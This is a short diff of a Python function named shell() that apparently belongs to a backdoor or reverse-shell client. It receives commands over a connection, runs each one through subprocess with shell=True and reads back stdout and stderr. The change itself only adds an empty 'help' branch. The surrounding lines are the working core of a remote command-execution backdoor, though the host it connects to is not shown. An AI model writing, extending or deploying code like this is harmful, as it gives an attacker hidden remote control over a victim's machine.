@@ -24,6 +24,8 @@ def shell():
         command = reliable_rcv()
         if command == "quit":
             break
+        if command == "help":
+            pass
         execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         result = execute.stdout.read() + execute.stderr.read()
         result = result.decode()
